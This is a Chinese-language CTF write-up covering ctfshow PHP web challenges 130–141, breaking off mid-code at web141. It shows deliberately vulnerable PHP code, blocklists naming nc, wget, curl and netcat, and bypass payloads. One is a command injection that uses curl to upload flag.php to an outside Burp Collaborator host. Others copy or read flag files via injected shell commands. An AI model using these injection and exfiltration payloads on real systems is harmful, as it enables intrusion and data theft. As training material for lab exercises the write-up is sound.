class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php特性：</p><p>preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0</p><p>if(0 === flase)返回值为false0不是强等于false的</p><p>stripos()函数对数组不识别，遇到数组会返回false</p><p>方法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=ctfshow[]</span><br></pre></td></tr></table></figure><p>方法二：</p><p>使用数组绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f[]=666</span><br></pre></td></tr></table></figure><p>方法三：</p><p><strong>p神</strong>：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>溢出回溯限制</p><p>利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://.ctf.show:8080/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><p>首先打开是一个网页，御剑扫一下有robots.txt和admin/index.php</p><p>打开admin/index.php得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本题很简单只需要让<code>username=admin&amp;&amp;code=admin</code>即可当然也要满足第一个条件</p><h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="https://php.p2hp.com/manual/zh/function.substr.php">substr()函数</a></p><p><a href="https://php.p2hp.com/manual/zh/function.shell-exec.php">shell_exec()函数</a></p><p><code>这个题是自己出的主要是考察，命令执行的骚操作和curl -F的使用</code><br> 分析一下代码发现仿佛是只能读取前面6个字符去执行命令，禁止了命令执行的函数，并且没有写入权限。可能利用就比较可能<br> 但是，如果我们传递的参数就是<code>$F</code>本身，会不会发生变量覆盖？<br> 那我们来一个简单的测试,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令</span><br><span class="line">**那为什么会这样？**</span><br><span class="line">因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数</span><br><span class="line">这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。</span><br><span class="line">而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是</span><br><span class="line">``$F`;+sleep 3`,就执行成功</span><br><span class="line">这里可能有点绕，慢慢理解</span><br></pre></td></tr></table></figure><p><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的参数用法</a></p><p>然后就是利用curl去带出flag.php<br> <code>curl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）</code></p><p><a href="https://zhuanlan.zhihu.com/p/473336511">Collaborator Client用法</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># payload </span><br><span class="line">#其中-F 为带文件的形式发送post请求</span><br><span class="line">#xx是上传文件的name值，flag.php就是上传的文件 </span><br><span class="line">?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span><br></pre></td></tr></table></figure><p>使用方法：</p><p><img src="https://img-blog.csdnimg.cn/20201015162350800.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201015162406514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDkxNDY0,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="web-134"><a href="#web-134" class="headerlink" title="web 134"></a>web 134</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-10-13 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-10-14 23:01:06</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class="line">    die(&quot;nonononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class="line">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简单的函数绕过：</p><p><a href="https://blog.csdn.net/qq_49480008/article/details/115872899">$_SERVER函数</a></p><p><a href="https://www.w3school.com.cn/php/func_array_extract.asp">extract()函数</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;&amp;_POST[key2]=36</span><br></pre></td></tr></table></figure><h1 id="web-135"><a href="#web-135" class="headerlink" title="web 135"></a>web 135</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure><h1 id="web-136"><a href="#web-136" class="headerlink" title="web 136"></a>web 136</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function check($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/jjlovefj/article/details/83176871">Linux tee命令</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常见用例： tee file //覆盖</span><br><span class="line">tee -a file //追加</span><br><span class="line">tee - //输出到标准输出两次 tee - - //输出到标准输出三次</span><br><span class="line">tee file1 file2 - //输出到标准输出两次,并写到那两个文件中</span><br><span class="line">ls | tee file</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=ls \|tee <span class="number">1</span></span><br><span class="line"><span class="comment">//将根目录下的内容写入1</span></span><br><span class="line">访问<span class="number">1</span>，下载文件发现f149_15_h3r3</span><br><span class="line">?c=nl /f149_15_h3r3|tee <span class="number">1</span></span><br><span class="line">访问<span class="number">1</span>，下载文件得flag</span><br></pre></td></tr></table></figure><h1 id="web-137"><a href="#web-137" class="headerlink" title="web 137"></a>web 137</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用类中函数，需要调用静态类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>payload：<code>ctfshow=ctfshow::getFlag</code></p><h1 id="web-138"><a href="#web-138" class="headerlink" title="web 138"></a>web 138</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strripos(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>php特性：</p><p>考察了call_user_func()用数组形式调用类方法</p><p>详看：根据方法名调用call_user_func()详解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">调用classname这个类里的sya_hello方法</span><br><span class="line"></span><br><span class="line">array[0]=$classname  类名</span><br><span class="line">array[1]=say_hello   say_hello()方法</span><br></pre></td></tr></table></figure><p>call_user_func函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><h1 id="web-139"><a href="#web-139" class="headerlink" title="web 139"></a>web 139</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h1 id="web-140"><a href="#web-140" class="headerlink" title="web 140"></a>web 140</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看<a href="https://www.php.net/manual/zh/types.comparisons.php">PHP类型比较表</a> 可发现</p><p><code>eval</code>函数的返回值默认是false，但是如果包含的语句中有return，则返回return的值</p><p><strong><code>0==“字符串”</code> 返回的是TRUE</strong></p><p><code>intval</code>会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1</span><br></pre></td></tr></table></figure><h1 id="web-141"><a href="#web-141" class="headerlink" title="web 141"></a>web 141</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span 